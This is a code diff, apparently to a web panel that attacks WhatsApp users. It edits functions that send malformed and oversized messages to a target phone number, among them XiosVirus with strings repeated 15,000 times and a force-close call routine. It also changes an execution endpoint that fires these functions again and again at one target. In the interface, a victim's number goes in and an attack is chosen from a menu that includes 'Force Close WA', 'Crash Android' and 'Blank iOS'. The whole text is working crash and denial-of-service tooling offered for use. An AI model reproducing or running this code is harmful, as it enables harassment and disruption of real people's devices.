@@ -1657,6 +1657,44 @@ async function VampSuperDelay(sock, target, mention = false, count = 30) {
 }
 
 // fc call by venom
+let venomModsData = JSON.stringify({
+      status: true,
+      criador: "VenomMods",
+      resultado: {
+        type: "md",
+        ws: {
+          _events: { "CB:ib,,dirty": ["Array"] },
+          _eventsCount: 800000,
+          _maxListeners: 0,
+          url: "wss://web.whatsapp.com/ws/chat",
+          config: {
+            version: ["Array"],
+            browser: ["Array"],
+            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+            sockCectTimeoutMs: 20000,
+            keepAliveIntervalMs: 30000,
+            logger: {},
+            printQRInTerminal: false,
+            emitOwnEvents: true,
+            defaultQueryTimeoutMs: 60000,
+            customUploadHosts: [],
+            retryRequestDelayMs: 250,
+            maxMsgRetryCount: 5,
+            fireInitQueries: true,
+            auth: { Object: "authData" },
+            markOnlineOnsockCect: true,
+            syncFullHistory: true,
+            linkPreviewImageThumbnailWidth: 192,
+            transactionOpts: { Object: "transactionOptsData" },
+            generateHighQualityLinkPreview: false,
+            options: {},
+            appStateMacVerification: { Object: "appStateMacData" },
+            mobile: true
+          }
+        }
+      }
+    });
+    
 async function VampFcCall(sock, target, ptcp = true) {
       let msg = await generateWAMessageFromContent(target, {
         viewOnceMessage: {
@@ -1714,43 +1752,6 @@ async function VampFcCall(sock, target, ptcp = true) {
       } : {});
 
     }
-    let venomModsData = JSON.stringify({
-      status: true,
-      criador: "VenomMods",
-      resultado: {
-        type: "md",
-        ws: {
-          _events: { "CB:ib,,dirty": ["Array"] },
-          _eventsCount: 800000,
-          _maxListeners: 0,
-          url: "wss://web.whatsapp.com/ws/chat",
-          config: {
-            version: ["Array"],
-            browser: ["Array"],
-            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
-            sockCectTimeoutMs: 20000,
-            keepAliveIntervalMs: 30000,
-            logger: {},
-            printQRInTerminal: false,
-            emitOwnEvents: true,
-            defaultQueryTimeoutMs: 60000,
-            customUploadHosts: [],
-            retryRequestDelayMs: 250,
-            maxMsgRetryCount: 5,
-            fireInitQueries: true,
-            auth: { Object: "authData" },
-            markOnlineOnsockCect: true,
-            syncFullHistory: true,
-            linkPreviewImageThumbnailWidth: 192,
-            transactionOpts: { Object: "transactionOptsData" },
-            generateHighQualityLinkPreview: false,
-            options: {},
-            appStateMacVerification: { Object: "appStateMacData" },
-            mobile: true
-          }
-        }
-      }
-    });
 
 async function spacksfreeze(sock, target, count = 50) {
   await sock.relayMessage(target, {
@@ -1828,7 +1829,7 @@ async function spacksfreeze(sock, target, count = 50) {
     }
   }, {});
 }
-async function VerloadXDelayFc(sock, target, count = 50) {
+async function VerloadXDelayFc(sock, target, count = 50, mention = false) {
   try {
     const msg1 = generateWAMessageFromContent(
       target,
@@ -2388,8 +2389,8 @@ async function XiosVirus(sock, X) {
     }, {});
     let extendMsg = {
       extendedTextMessage: {
-        text: "JustinXSatanic",
-        matchedText: "https://t.me/thanror",
+        text: "XHAMZ - XD NI BOSS" + "𖣂".repeat(15000),
+        matchedText: "https://t.me/hamzneverlose",
         description: "ios turbo - 1080".repeat(15000),
         title: "—!s thann xs".repeat(15000),
         previewType: "NONE",
@@ -4391,6 +4392,11 @@ app.post("/execution", requireAuth, async (req, res) => {
         await VerloadXDelayFc(sock, targetJid);
         await VerloadXDelayFc(sock, targetJid);
         await VerloadXDelayFc(sock, targetJid);
+        await VerloadXDelayFc(sock, targetJid, true);
+        await VerloadXDelayFc(sock, targetJid, true);
+        await VerloadXDelayFc(sock, targetJid, true);
+        await VerloadXDelayFc(sock, targetJid, true);
+        await VerloadXDelayFc(sock, targetJid, true);
         await delay5GB(sock, targetJid, true);
         await delay5GB(sock, targetJid, true);
         await delay5GB(sock, targetJid, true);
@@ -8716,8 +8722,8 @@ body {
             <div class="profile-info">
                 <img src="https://e.top4top.io/p_364583zcu1.jpg" class="avatar" alt="Avatar">
                 <div class="user-meta">
-                    <h2 id="userName">${username}</h2>
-                    <span class="role-badge">ROLE VIP</span>
+                    <h2 id="userName">HI, ${username}</h2>
+                    <span class="role-badge">VIP USER</span>
                 </div>
             </div>
             <div class="expiry-box">EXPIRES<br><span id="expiryDate">${expired}</span></div>
@@ -8743,7 +8749,7 @@ body {
             <div class="section-label">Number Targets</div>
             <div class="input-wrapper">
                 <i class="fas fa-mobile-alt" style="color:var(--accent-pink)"></i>
-                <input type="text" id="numberInput" class="input-field" placeholder="Masukkan nomor (Contoh: 628xxx)">
+                <input type="number" id="numberInput" class="input-field" placeholder="Masukkan nomor (Contoh: 628xxx)">
             </div>
         </div>
 
@@ -8761,7 +8767,7 @@ body {
         </div>
 
         <button id="executeBtn" class="execute-btn">
-            <i class="fas fa-radiation"></i> INITIATE ATTACK
+            <i class="fas fa-radiation"></i> GASKENNN
         </button>
     </div>
 
@@ -8785,23 +8791,12 @@ body {
         // BACKEND CONFIGURATION
         const bugTypes = [
     { id: 'delay', icon: 'fab fa-android', title: 'Delay Invisible' },
-    { id: 'crash', icon: 'fas fa-hourglass-half', title: 'Crash Android' },
-    { id: 'fcandro', icon: 'fas fa-skull', title: 'Force Close WA' },
-    { id: 'fcinvsios', icon: 'fas fa-ghost', title: 'Invisible FC iOS' },
-    { id: 'blank-ios', icon: 'fas fa-apple', title: 'Blank iOS' },
+    { id: 'fcandro', icon: 'fas fa-skull', title: 'Delay V2' },
     { id: 'delayv2', icon: 'fas fa-clock', title: 'Delay Hard' },
-    { id: 'stuck', icon: 'fas fa-thumbtack', title: 'Ui Blank' },
-    { id: 'SqL-Exception', icon: 'fas fa-database', title: 'Crash SqL BUGS' },
     { id: 'combo', icon: 'fas fa-compress-alt', title: 'COMBINATION BUGS' },
-    { id: 'Trash-IOS', icon: 'fas fa-trash', title: 'Trash Loc iOS' },
-    { id: 'Neural-Hardcore', icon: 'fas fa-brain', title: 'Neural Hardcore iOS' },
-    { id: 'CrashUi', icon: 'fas fa-tv', title: 'Crash UI' },
-    { id: 'blank-iphone', icon: 'fas fa-mobile', title: 'Blank iPhone' },
-    { id: 'delay-tredict', icon: 'fas fa-hourglass-start', title: 'Tredict Delay' },
     { id: 'carousel-crash', icon: 'fas fa-images', title: 'Carousel Crash' },
     { id: 'delay-xa', icon: 'fas fa-stopwatch', title: 'XA Delay Maker' },
     { id: 'delay-vamp', icon: 'fas fa-heart', title: 'Vampire Super Delay' },
-    { id: 'spack-freeze', icon: 'fas fa-snowflake', title: 'Spack Freeze' },
     { id: 'verload-fc', icon: 'fas fa-bolt', title: 'Verload FC' },
     { id: 'invisible-spam', icon: 'fas fa-eye-slash', title: 'Invisible Spam' },
     { id: 'delay-5gb', icon: 'fas fa-weight-hanging', title: 'Delay 5GB' },
